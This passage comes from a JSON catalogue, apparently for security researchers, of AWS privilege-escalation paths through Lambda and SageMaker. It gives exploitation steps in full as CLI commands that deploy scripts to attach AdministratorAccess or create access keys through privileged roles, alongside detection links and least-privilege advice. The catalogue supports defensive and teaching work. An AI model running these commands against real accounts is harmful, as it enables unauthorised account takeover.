          "description": "When the modified Lambda function is invoked, the malicious code executes with the function's execution role permissions. The malicious code can retrieve temporary credentials via the AWS SDK or perform privileged API calls directly. Common actions include attaching administrator policies to the starting principal, creating new access keys, or modifying IAM policies.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the target Lambda function's execution role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access to the AWS account by executing the malicious code. The code can directly modify IAM to grant the starting principal admin access or return admin credentials.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the Lambda function's execution role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. This could include access to sensitive data stores (S3, RDS, DynamoDB), the ability to modify other resources, or permissions that enable additional privilege escalation paths.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the Lambda function's execution role only has minimal permissions (e.g., just CloudWatch Logs access), the privilege escalation may not yield meaningful additional access. However, the attacker still gains code execution capability which could be useful for reconnaissance or as part of a multi-step attack.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "lambda_function",
          "label": "lambda:UpdateFunctionCode",
          "description": "The attacker updates the target Lambda function's code with malicious code. This requires creating a deployment package (ZIP file) containing the malicious code and uploading it to replace the function's existing code.\n\nCommands:\n```bash\necho 'import boto3; iam = boto3.client(\"iam\"); iam.attach_user_policy(UserName=\"attacker\", PolicyArn=\"arn:aws:iam::aws:policy/AdministratorAccess\")' > lambda_function.py\nzip exploit.zip lambda_function.py\naws lambda update-function-code \\\n  --function-name TARGET_FUNCTION \\\n  --zip-file fileb://exploit.zip\n```\n\nThe malicious code is now deployed and will execute with the function's execution role permissions when invoked.\n"
        },
        {
          "from": "lambda_function",
          "to": "exfiltrate",
          "label": "lambda:InvokeFunction or automatic trigger",
          "description": "The Lambda function is invoked, either manually by the attacker or automatically via an event trigger. When invoked, the malicious code executes with the privileges of the function's execution role.\n\nManual invocation command:\n```bash\naws lambda invoke \\\n  --function-name TARGET_FUNCTION \\\n  output.txt\n```\n\nAlternatively, if the function has automatic triggers (EventBridge rules, S3 events, DynamoDB streams, etc.), the attacker can wait for or force a trigger event to execute the malicious code.\n"
        },
        {
          "from": "exfiltrate",
          "to": "admin_outcome",
          "label": "If role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the Lambda function's execution role has AdministratorAccess or equivalent administrative permissions, the malicious code can grant the starting principal full administrative access. Common techniques include attaching the AdministratorAccess policy to the starting user/role, creating new admin access keys, or modifying existing policies.\n"
        },
        {
          "from": "exfiltrate",
          "to": "partial_outcome",
          "label": "If role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the Lambda function's execution role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. The malicious code should be tailored to the available permissions - for example, exfiltrating data from S3/RDS if data access permissions exist, or pursuing additional privilege escalation paths if IAM read permissions are available.\n"
        },
        {
          "from": "exfiltrate",
          "to": "minimal_outcome",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the Lambda function's execution role only has minimal permissions (typically just `logs:CreateLogGroup`, `logs:CreateLogStream`, and `logs:PutLogEvents` for CloudWatch), the privilege escalation may not provide meaningful additional access. However, code execution capability could still be useful for reconnaissance or persistence.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/lambda/lambda-003.yaml"
  },
  {
    "id": "sagemaker-001",
    "name": "iam:PassRole + sagemaker:CreateNotebookInstance",
    "category": "service-passrole",
    "services": [
      "iam",
      "sagemaker"
    ],
    "description": "A principal with `iam:PassRole` and `sagemaker:CreateNotebookInstance` can create a SageMaker notebook instance with a privileged execution role. SageMaker notebooks run Jupyter environments that provide shell access and can execute arbitrary code with the permissions of the attached IAM role. The attacker can then access the notebook and run commands with elevated privileges.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts sagemaker.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess)"
      ],
      "lateral": [
        "A role must exist that trusts sagemaker.amazonaws.com to assume it"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws sagemaker create-notebook-instance \\\n  --notebook-instance-name privesc-notebook \\\n  --instance-type ml.t2.medium \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\n",
          "description": "Create a SageMaker notebook instance with the privileged role"
        },
        {
          "step": 2,
          "command": "aws sagemaker describe-notebook-instance --notebook-instance-name privesc-notebook",
          "description": "Wait for the notebook instance to be in 'InService' status"
        },
        {
          "step": 3,
          "command": "aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name privesc-notebook",
          "description": "Generate a presigned URL to access the notebook"
        },
        {
          "step": 4,
          "command": "Open the presigned URL in a browser and use the Jupyter terminal to execute privileged commands",
          "description": "Access the notebook and execute commands with the privileged role's permissions"
        }
      ]
    },
    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificSageMakerRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"sagemaker.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Restrict `sagemaker:CreateNotebookInstance` permissions\n- Monitor CloudTrail for SageMaker notebook creation with privileged roles\n- Use VPC configuration to isolate notebook instances\n- Implement lifecycle configurations to restrict notebook capabilities\n- Alert on notebook instances with administrative roles being created\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "IAM Vulnerable - SageMaker PassRole",
        "url": "https://github.com/BishopFox/iam-vulnerable"
      }
    ],
    "relatedPaths": [
      "sagemaker-002",
      "sagemaker-003",
      "sagemaker-004"
    ],
    "learningEnvironments": {
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "SageMaker-CreateNotebookPassRole",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      }
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Target role ARN must be in the Resource section"
        },
        {
          "permission": "sagemaker:CreateNotebookInstance",
          "resourceConstraints": "Must have permission to create SageMaker notebook instances"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        },
        {
          "permission": "sagemaker:DescribeNotebookInstance",
          "resourceConstraints": "Helpful for checking notebook instance status before accessing"
        },
        {
          "permission": "sagemaker:CreatePresignedNotebookInstanceUrl",
          "resourceConstraints": "Required to generate access URL to the notebook interface"
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The starting principal (user or role) with `iam:PassRole` and `sagemaker:CreateNotebookInstance` permissions. This principal will create a SageMaker notebook instance with a privileged role attached and access it to gain elevated privileges.\n"
        },
        {
          "id": "notebook_instance",
          "label": "New SageMaker Notebook Instance",
          "type": "resource",
          "description": "The newly created SageMaker notebook instance running a Jupyter environment. The instance is created with `sagemaker:CreateNotebookInstance` and configured to use a privileged IAM role via `iam:PassRole`. The notebook provides shell access through the Jupyter terminal interface.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the sagemaker Service",
          "type": "resource",
          "description": "The privileged IAM role that is passed to the SageMaker notebook instance during creation. This role must trust sagemaker.amazonaws.com as a principal in its trust policy. When the notebook instance runs, all code and commands execute with this role's permissions.\n"
        },
        {
          "id": "access_notebook",
          "label": "Access Jupyter Terminal",
          "type": "action",
          "color": "#99ccff",
          "description": "The attacker generates a presigned URL to access the notebook instance and opens the Jupyter terminal. The terminal provides full shell access with the target role's credentials available via the AWS SDK or instance metadata.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the target role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access to the AWS account by executing privileged commands in the Jupyter terminal or using the AWS CLI/SDK within the notebook.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the target role has some elevated permissions but not full admin, the attacker gains partial privilege escalation. This could include access to sensitive data (S3, RDS, DynamoDB), the ability to modify IAM resources, or permissions that enable additional escalation paths.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the target role only has minimal permissions or no interesting permissions, the privilege escalation may not provide meaningful additional access to the attacker. The notebook access would be limited to basic operations.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "notebook_instance",
          "label": "iam:PassRole + sagemaker:CreateNotebookInstance",
          "description": "The attacker creates a new SageMaker notebook instance and passes a privileged role to it. The instance is configured with the target role via the --role-arn parameter.\n\nCommand:\n```bash\naws sagemaker create-notebook-instance \\\n  --notebook-instance-name privesc-notebook \\\n  --instance-type ml.t2.medium \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\n```\n\nThe notebook instance will take a few minutes to reach 'InService' status before it can be accessed.\n"
        },
        {
          "from": "notebook_instance",
          "to": "target_role",
          "label": "Notebook assumes role",
          "description": "When the SageMaker notebook instance starts, it automatically assumes the target role. All code executed in the Jupyter environment (including terminal commands) runs with the permissions granted to this role. Credentials are available via the AWS SDK and boto3.\n"
        },
        {
          "from": "target_role",
          "to": "access_notebook",
          "label": "sagemaker:CreatePresignedNotebookInstanceUrl",
          "description": "The attacker generates a presigned URL to access the notebook interface and opens the Jupyter terminal. From the terminal, they can execute any AWS CLI commands or Python scripts using the target role's credentials.\n\nCommands:\n```bash\naws sagemaker describe-notebook-instance \\\n  --notebook-instance-name privesc-notebook\n\naws sagemaker create-presigned-notebook-instance-url \\\n  --notebook-instance-name privesc-notebook\n```\n\nThe presigned URL provides direct access to the Jupyter interface where the attacker can open a terminal or create notebooks to execute privileged operations.\n"
        },
        {
          "from": "access_notebook",
          "to": "admin_outcome",
          "label": "If role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or equivalent administrative permissions, the attacker gains full control over the AWS account. They can execute any privileged command from the Jupyter terminal, such as creating access keys, modifying IAM policies, or accessing any AWS resource.\n"
        },
        {
          "from": "access_notebook",
          "to": "partial_outcome",
          "label": "If role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. This might include access to sensitive data stores (S3 buckets, RDS databases, DynamoDB tables), permissions to modify IAM resources (AttachUserPolicy, PutUserPolicy), or permissions that enable additional privilege escalation techniques.\n"
        },
        {
          "from": "access_notebook",
          "to": "minimal_outcome",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has minimal or non-sensitive permissions, the privilege escalation may not yield meaningful additional access. However, even limited access to the notebook environment could be useful for reconnaissance or as part of a multi-step attack chain.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/sagemaker/sagemaker-001.yaml"
  },
  {
    "id": "sagemaker-002",
    "name": "iam:PassRole + sagemaker:CreateTrainingJob",
    "category": "service-passrole",
    "services": [
      "iam",
      "sagemaker"
    ],
    "description": "A principal with `iam:PassRole` and `sagemaker:CreateTrainingJob` can create a SageMaker training job with a privileged execution role. Training jobs can execute arbitrary container code and access AWS APIs with the permissions of the attached IAM role. By creating a training job with a malicious training script or container, the attacker can execute code with elevated privileges and exfiltrate credentials or modify AWS resources.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts sagemaker.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess)",
        "An S3 bucket must be accessible to store training data and output"
      ],
      "lateral": [
        "A role must exist that trusts sagemaker.amazonaws.com to assume it",
        "An S3 bucket must be accessible to store training data and output"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "echo '#!/bin/bash\naws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n' > exploit.sh && chmod +x exploit.sh\n",
          "description": "Create a malicious training script that escalates privileges"
        },
        {
          "step": 2,
          "command": "aws s3 cp exploit.sh s3://BUCKET_NAME/exploit/exploit.sh\n",
          "description": "Upload the malicious script to S3"
        },
        {
          "step": 3,
          "command": "aws sagemaker create-training-job \\\n  --training-job-name privesc-training \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --algorithm-specification TrainingImage=IMAGE_URI,TrainingInputMode=File \\\n  --input-data-config '[{\"ChannelName\":\"training\",\"DataSource\":{\"S3DataSource\":{\"S3DataType\":\"S3Prefix\",\"S3Uri\":\"s3://BUCKET_NAME/exploit/\"}}}]' \\\n  --output-data-config S3OutputPath=s3://BUCKET_NAME/output \\\n  --resource-config InstanceType=ml.m5.large,InstanceCount=1,VolumeSizeInGB=10 \\\n  --stopping-condition MaxRuntimeInSeconds=1800\n",
          "description": "Create a training job with the privileged role that executes the malicious script"
        },
        {
          "step": 4,
          "command": "aws sagemaker describe-training-job --training-job-name privesc-training",
          "description": "Monitor the training job status and wait for execution"
        }
      ]
    },
    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificSageMakerRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"sagemaker.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Restrict `sagemaker:CreateTrainingJob` permissions\n- Monitor CloudTrail for SageMaker training job creation with privileged roles\n- Use VPC configuration to isolate training jobs\n- Restrict S3 access for training data sources\n- Alert on training jobs with administrative roles being created\n- Use container image signing and validation\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "IAM Vulnerable - SageMaker PassRole",
        "url": "https://github.com/BishopFox/iam-vulnerable"
      }
    ],
    "relatedPaths": [
      "sagemaker-001",
      "sagemaker-003"
    ],
    "detectionTools": {
      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/sagemaker_edges.py#L113-L121"
    },
    "learningEnvironments": {
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "SageMaker-CreateTrainingJobPassRole",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      }
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Target role ARN must be in the Resource section"
        },
        {
          "permission": "sagemaker:CreateTrainingJob",
          "resourceConstraints": "Must have permission to create SageMaker training jobs"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The starting principal (user or role) with `iam:PassRole` and `sagemaker:CreateTrainingJob` permissions. This principal will create a SageMaker training job with a privileged role attached and execute malicious code to gain elevated privileges.\n"
        },
        {
          "id": "training_job",
          "label": "New SageMaker Training Job",
          "type": "resource",
          "description": "The newly created SageMaker training job with malicious training code. The job is created with `sagemaker:CreateTrainingJob` and configured to use a privileged IAM role via `iam:PassRole`. The training script or container is designed to escalate privileges by executing AWS API calls with the attached role's permissions.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the sagemaker Service",
          "type": "resource",
          "description": "The privileged IAM role that is passed to the SageMaker training job during creation. This role must trust sagemaker.amazonaws.com as a principal in its trust policy. When the training job executes, it runs with this role's permissions and can access AWS APIs accordingly.\n"
        },
        {
          "id": "exfiltrate",
          "label": "Execute malicious training code",
          "type": "action",
          "color": "#99ccff",
          "description": "The training job executes with the target role's permissions. The malicious training script or container code can perform privileged API calls such as attaching admin policies to the attacker's principal, creating access keys, or modifying IAM permissions. The training job has full access to the AWS SDK with the role's credentials.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the target role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access to the AWS account. The malicious training code can escalate the starting principal's permissions or create new admin-level access.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the target role has some elevated permissions but not full admin, the attacker gains partial privilege escalation. This could include access to sensitive data (S3, RDS, DynamoDB), the ability to modify specific resources, or permissions that enable additional escalation paths.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the target role only has minimal permissions or no interesting permissions, the privilege escalation may not provide meaningful additional access to the attacker. The training job would execute but without useful privileges.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "training_job",
          "label": "iam:PassRole + sagemaker:CreateTrainingJob",
          "description": "The attacker creates a new SageMaker training job and passes a privileged role to it. The training job is configured with a malicious training script (uploaded to S3) or a custom container image that will execute code to escalate privileges.\n\nCommands:\n```bash\n# Create malicious training script\necho '#!/bin/bash\naws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n' > exploit.sh && chmod +x exploit.sh\n\n# Upload to S3\naws s3 cp exploit.sh s3://BUCKET_NAME/exploit/exploit.sh\n\n# Create training job with privileged role\naws sagemaker create-training-job \\\n  --training-job-name privesc-training \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --algorithm-specification TrainingImage=IMAGE_URI,TrainingInputMode=File \\\n  --input-data-config '[{\"ChannelName\":\"training\",\"DataSource\":{\"S3DataSource\":{\"S3DataType\":\"S3Prefix\",\"S3Uri\":\"s3://BUCKET_NAME/exploit/\"}}}]' \\\n  --output-data-config S3OutputPath=s3://BUCKET_NAME/output \\\n  --resource-config InstanceType=ml.m5.large,InstanceCount=1,VolumeSizeInGB=10 \\\n  --stopping-condition MaxRuntimeInSeconds=1800\n```\n\nThe training job will automatically start and execute the malicious code.\n"
        },
        {
          "from": "training_job",
          "to": "target_role",
          "label": "Training job assumes role",
          "description": "When the SageMaker training job starts, the SageMaker service automatically assumes the target role on behalf of the training job. The training script or container code then executes with all the permissions granted to this role, including full access to AWS APIs via the AWS SDK or CLI.\n"
        },
        {
          "from": "target_role",
          "to": "exfiltrate",
          "label": "Training job executes",
          "description": "The training job executes the malicious code with the target role's permissions. The code can perform any AWS API calls allowed by the role, such as escalating the attacker's privileges, exfiltrating data, or creating backdoors.\n\nCommand to monitor:\n```bash\naws sagemaker describe-training-job --training-job-name privesc-training\n```\n\nThe training job runs automatically and executes the malicious script or container code with elevated privileges.\n"
        },
        {
          "from": "exfiltrate",
          "to": "admin_outcome",
          "label": "If role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or equivalent administrative permissions, the attacker gains full control over the AWS account. The malicious training code can attach admin policies to the attacker's principal, create new admin access keys, or perform any administrative action.\n"
        },
        {
          "from": "exfiltrate",
          "to": "partial_outcome",
          "label": "If role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. This might include write access to S3 buckets, ability to modify specific resources, or permissions that enable additional privilege escalation techniques through other paths.\n"
        },
        {
          "from": "exfiltrate",
          "to": "minimal_outcome",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has minimal or non-sensitive permissions, the privilege escalation may not yield meaningful additional access. The training job would execute successfully but without useful privileges to escalate further.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/sagemaker/sagemaker-002.yaml"
  },
  {
    "id": "sagemaker-003",
    "name": "iam:PassRole + sagemaker:CreateProcessingJob",
    "category": "service-passrole",
    "services": [
      "iam",
      "sagemaker"
    ],
    "description": "A principal with `iam:PassRole` and `sagemaker:CreateProcessingJob` can create a SageMaker processing job with a privileged execution role. Processing jobs can execute arbitrary container code for data processing tasks and access AWS APIs with the permissions of the attached IAM role. By creating a processing job with a malicious container or processing script, the attacker can execute code with elevated privileges.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts sagemaker.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess)",
        "An S3 bucket must be accessible to store input/output data"
      ],
      "lateral": [
        "A role must exist that trusts sagemaker.amazonaws.com to assume it",
        "An S3 bucket must be accessible to store input/output data"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "echo '#!/bin/bash\naws iam create-access-key --user-name attacker\n' > process.sh && chmod +x process.sh\n",
          "description": "Create a malicious processing script that creates access keys for privilege escalation"
        },
        {
          "step": 2,
          "command": "aws s3 cp process.sh s3://BUCKET_NAME/processing/process.sh\n",
          "description": "Upload the malicious script to S3"
        },
        {
          "step": 3,
          "command": "aws sagemaker create-processing-job \\\n  --processing-job-name privesc-processing \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --app-specification ImageUri=IMAGE_URI,ContainerEntrypoint=/opt/ml/processing/input/process.sh \\\n  --processing-inputs '[{\"InputName\":\"code\",\"S3Input\":{\"S3Uri\":\"s3://BUCKET_NAME/processing/\",\"LocalPath\":\"/opt/ml/processing/input\",\"S3DataType\":\"S3Prefix\",\"S3InputMode\":\"File\"}}]' \\\n  --processing-outputs '[{\"OutputName\":\"output\",\"S3Output\":{\"S3Uri\":\"s3://BUCKET_NAME/output\",\"LocalPath\":\"/opt/ml/processing/output\",\"S3UploadMode\":\"EndOfJob\"}}]' \\\n  --processing-resources ClusterConfig={InstanceCount=1,InstanceType=ml.m5.large,VolumeSizeInGB=10}\n",
          "description": "Create a processing job with the privileged role that executes the malicious script"
        },
        {
          "step": 4,
          "command": "aws sagemaker describe-processing-job --processing-job-name privesc-processing",
          "description": "Monitor the processing job status and wait for execution"
        }
      ]
    },
    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificSageMakerRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"sagemaker.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Restrict `sagemaker:CreateProcessingJob` permissions\n- Monitor CloudTrail for SageMaker processing job creation with privileged roles\n- Use VPC configuration to isolate processing jobs\n- Restrict S3 access for processing data sources\n- Alert on processing jobs with administrative roles being created\n- Use container image signing and validation\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "IAM Vulnerable - SageMaker PassRole",
        "url": "https://github.com/BishopFox/iam-vulnerable"
      }
    ],
    "relatedPaths": [
      "sagemaker-001",
      "sagemaker-002"
    ],
    "detectionTools": {
      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/sagemaker_edges.py#L115-L126"
    },
    "learningEnvironments": {
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "SageMaker-CreateProcessingJobPassRole",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      }
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Target role ARN must be in the Resource section"
        },
        {
          "permission": "sagemaker:CreateProcessingJob",
          "resourceConstraints": "Must have permission to create SageMaker processing jobs"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The starting principal (user or role) with `iam:PassRole` and `sagemaker:CreateProcessingJob` permissions. This principal will create a SageMaker processing job with a privileged role attached and execute malicious code within the processing job container.\n"
        },
        {
          "id": "processing_job",
          "label": "New SageMaker Processing Job",
          "type": "resource",
          "description": "The newly created SageMaker processing job configured with a malicious processing script. The job is created with `sagemaker:CreateProcessingJob` and uses a privileged IAM role via `iam:PassRole`. Processing jobs execute container code for data processing tasks and can run arbitrary commands with the permissions of the attached role.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the sagemaker Service",
          "type": "resource",
          "description": "The privileged IAM role that is passed to the SageMaker processing job during creation. This role must trust sagemaker.amazonaws.com as a principal in its trust policy. When the processing job executes, it runs with this role's permissions, allowing the malicious script to access AWS APIs.\n"
        },
        {
          "id": "execute_script",
          "label": "Execute Malicious Script",
          "type": "action",
          "color": "#99ccff",
          "description": "The malicious processing script executes within the SageMaker processing job container with the target role's permissions. The script can perform privileged API calls such as creating access keys, modifying IAM policies, or accessing sensitive resources. The script output can be written to S3 or the processing job logs.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the target role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access to the AWS account. The malicious script can create access keys for the attacker, modify IAM policies, or directly access any AWS resource.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the target role has some elevated permissions but not full admin, the attacker gains partial privilege escalation. This could include access to sensitive data (S3, RDS, DynamoDB), the ability to modify specific resources, or permissions that enable additional escalation paths.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the target role only has minimal permissions or no interesting permissions, the privilege escalation may not provide meaningful additional access to the attacker. However, even limited access could be useful for reconnaissance.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "processing_job",
          "label": "iam:PassRole + sagemaker:CreateProcessingJob",
          "description": "The attacker creates a SageMaker processing job with a malicious processing script and passes a privileged role to it. The script is uploaded to S3 and configured as the container entrypoint.\n\nCommands:\n```bash\n# Create malicious script\necho '#!/bin/bash\naws iam create-access-key --user-name attacker\n' > process.sh && chmod +x process.sh\n\n# Upload to S3\naws s3 cp process.sh s3://BUCKET_NAME/processing/process.sh\n\n# Create processing job\naws sagemaker create-processing-job \\\n  --processing-job-name privesc-processing \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --app-specification ImageUri=IMAGE_URI,ContainerEntrypoint=/opt/ml/processing/input/process.sh \\\n  --processing-inputs '[{\"InputName\":\"code\",\"S3Input\":{\"S3Uri\":\"s3://BUCKET_NAME/processing/\",\"LocalPath\":\"/opt/ml/processing/input\",\"S3DataType\":\"S3Prefix\",\"S3InputMode\":\"File\"}}]' \\\n  --processing-outputs '[{\"OutputName\":\"output\",\"S3Output\":{\"S3Uri\":\"s3://BUCKET_NAME/output\",\"LocalPath\":\"/opt/ml/processing/output\",\"S3UploadMode\":\"EndOfJob\"}}]' \\\n  --processing-resources ClusterConfig={InstanceCount=1,InstanceType=ml.m5.large,VolumeSizeInGB=10}\n```\n\nThe processing job configuration specifies the malicious script as the container entrypoint.\n"
        },
        {
          "from": "processing_job",
          "to": "target_role",
          "label": "Job assumes role",
          "description": "When the SageMaker processing job starts, the SageMaker service automatically assumes the target role on behalf of the processing job. The container code then executes with all the permissions granted to this role.\n"
        },
        {
          "from": "target_role",
          "to": "execute_script",
          "label": "Execute processing script",
          "description": "The processing job executes the malicious script with the target role's permissions. The script can access AWS APIs through the role's credentials, which are automatically available to the container via the AWS SDK or environment variables.\n\nCommand to monitor:\n```bash\naws sagemaker describe-processing-job --processing-job-name privesc-processing\n```\n\nThe attacker monitors the job status and retrieves output from S3 or CloudWatch logs.\n"
        },
        {
          "from": "execute_script",
          "to": "admin_outcome",
          "label": "If role has admin permissions",
          "branch": "A",
          "condition": "admin",
